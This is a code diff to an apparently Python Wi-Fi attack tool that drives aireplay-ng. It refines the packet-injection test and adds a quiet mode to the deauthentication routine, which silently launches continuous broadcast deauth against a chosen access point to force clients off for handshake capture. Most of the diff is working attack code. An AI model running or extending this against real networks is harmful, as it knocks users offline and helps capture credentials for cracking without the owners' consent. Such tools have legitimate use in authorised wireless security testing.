@@ -23,6 +23,7 @@ STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""
 # Global attack process variable
 ATTACK_PROCESS: Optional[subprocess.Popen] = None
 ATTACK_RUNNING = False
+ATTACK_METHOD: Optional[str] = None
 MONITOR_SETTLE_SECONDS = 2.0
 SCAN_BUSY_RETRY_DELAY = 0.8
 SCAN_COMMAND_TIMEOUT = 4.0
@@ -733,8 +734,6 @@ def cleanup() -> None:
 
 def test_packet_injection(interface: str) -> bool:
     """Test packet injection with aireplay-ng"""
-    logging.info(color_text("\n[TEST] Testing packet injection...", COLOR_HEADER))
-    
     # Test 1: Basic injection test
     test_cmd = ["aireplay-ng", "--test", interface]
     
@@ -747,24 +746,28 @@ def test_packet_injection(interface: str) -> bool:
             timeout=10
         )
         
-        if result.returncode == 0:
-            if "Injection is working!" in result.stdout:
-                logging.info(color_text("✓ Packet injection working!", COLOR_SUCCESS))
-                return True
-            else:
-                logging.warning("Injection test output:")
-                print(result.stdout[:500])
-                return False
-        else:
-            logging.error("Injection test failed:")
-            print(result.stderr[:500])
-            return False
+        if result.returncode == 0 and "Injection is working!" in result.stdout:
+            logging.info(color_text("[TEST] Packet injection: OK", COLOR_SUCCESS))
+            return True
+
+        # Keep this to a single line by default; the aireplay-ng output is noisy and
+        # often not actionable. Enable verbose output via SWISSKNIFE_DEAUTH_DEBUG=1.
+        if os.environ.get("SWISSKNIFE_DEAUTH_DEBUG") == "1":
+            stdout = (result.stdout or "").strip()
+            stderr = (result.stderr or "").strip()
+            if stdout:
+                logging.info("Injection test stdout (truncated):\n%s", stdout[:800])
+            if stderr:
+                logging.info("Injection test stderr (truncated):\n%s", stderr[:800])
+
+        logging.warning(color_text("[TEST] Packet injection: not confirmed (continuing).", COLOR_WARNING))
+        return False
             
     except subprocess.TimeoutExpired:
-        logging.error("Injection test timeout")
+        logging.warning(color_text("[TEST] Packet injection: timeout (continuing).", COLOR_WARNING))
         return False
     except Exception as e:
-        logging.error(f"Injection test error: {e}")
+        logging.warning(color_text(f"[TEST] Packet injection: error ({e})", COLOR_WARNING))
         return False
 
 
@@ -1039,8 +1042,8 @@ def monitor_attack_output(process: subprocess.Popen):
         t2.start()
 
 
-def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
-    global ATTACK_PROCESS, ATTACK_RUNNING
+def start_deauth_attack(interface: str, target: Dict[str, Optional[str]], quiet: bool = False) -> bool:
+    global ATTACK_PROCESS, ATTACK_RUNNING, ATTACK_METHOD
     bssid = target["bssid"]
     channel = target["channel"]
     
@@ -1050,7 +1053,8 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
 
     # Set channel FIRST (before any tests)
     if channel:
-        logging.info(color_text(f"\n[SETUP] Setting channel {channel}...", COLOR_HEADER))
+        if not quiet:
+            logging.info(color_text(f"\n[SETUP] Setting channel {channel}...", COLOR_HEADER))
         for attempt in range(3):
             result = subprocess.run(
                 ["iw", "dev", interface, "set", "channel", str(channel)],
@@ -1059,21 +1063,56 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
                 text=True
             )
             if result.returncode == 0:
-                logging.info(color_text(f"✓ Channel {channel} set", COLOR_SUCCESS))
+                if not quiet:
+                    logging.info(color_text(f"✓ Channel {channel} set", COLOR_SUCCESS))
                 break
             else:
-                logging.warning(f"Attempt {attempt+1} failed: {result.stderr.strip()}")
+                if not quiet:
+                    logging.warning(f"Attempt {attempt+1} failed: {result.stderr.strip()}")
                 time.sleep(1)
 
     # Test injection (non-blocking - just a warning if it fails)
-    if not test_packet_injection(interface):
-        logging.warning(color_text("⚠ Packet injection test failed, continuing anyway...", COLOR_WARNING))
-        logging.info("Note: Some drivers don't respond to injection tests but still work.")
+    if not quiet:
+        injection_ok = test_packet_injection(interface)
+        if not injection_ok:
+            logging.info("Note: Some drivers don't respond to injection tests but still work.")
 
     # Find connected clients (optional but recommended)
-    clients = []
-    if channel:
+    clients: List[str] = []
+    if channel and not quiet:
         clients = find_connected_clients(interface, bssid, channel)
+
+    if quiet:
+        # Handshake capture workflows (e.g. Handshaker) need a deauth pulse but not
+        # the full interactive output. Keep it minimal and start broadcast deauth.
+        cmd = [
+            "aireplay-ng",
+            "-0", "0",  # 0 means continuous
+            "-a", bssid,
+            interface,
+        ]
+        try:
+            ATTACK_PROCESS = subprocess.Popen(
+                cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid,
+            )
+        except FileNotFoundError:
+            logging.error("Required tool 'aireplay-ng' not found.")
+            return False
+        except Exception as exc:
+            logging.error("Failed to start deauth process: %s", exc)
+            return False
+
+        time.sleep(2)
+        if ATTACK_PROCESS.poll() is not None:
+            ATTACK_PROCESS = None
+            return False
+
+        ATTACK_RUNNING = True
+        ATTACK_METHOD = "aireplay-ng (broadcast)"
+        return True
 
     # Try different attack methods
     methods = [
@@ -1108,6 +1147,7 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
                     logging.info(f"• Targeting {len(clients)} client(s)")
                 logging.info(f"• Interface: {interface}")
                 
+                ATTACK_METHOD = method_name
                 return True
             else:
                 logging.warning(f"{method_name} stopped unexpectedly")
@@ -1117,10 +1157,11 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
     return False
 
 
-def stop_attack() -> None:
-    global ATTACK_PROCESS, ATTACK_RUNNING
+def stop_attack(quiet: bool = False) -> None:
+    global ATTACK_PROCESS, ATTACK_RUNNING, ATTACK_METHOD
     if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
-        logging.info("Stopping attack...")
+        if not quiet:
+            logging.info("Stopping attack...")
         try:
             try:
                 pgid = os.getpgid(ATTACK_PROCESS.pid)
@@ -1159,6 +1200,7 @@ def stop_attack() -> None:
     
     ATTACK_PROCESS = None
     ATTACK_RUNNING = False
+    ATTACK_METHOD = None
 
 
 def attack_monitor() -> None:
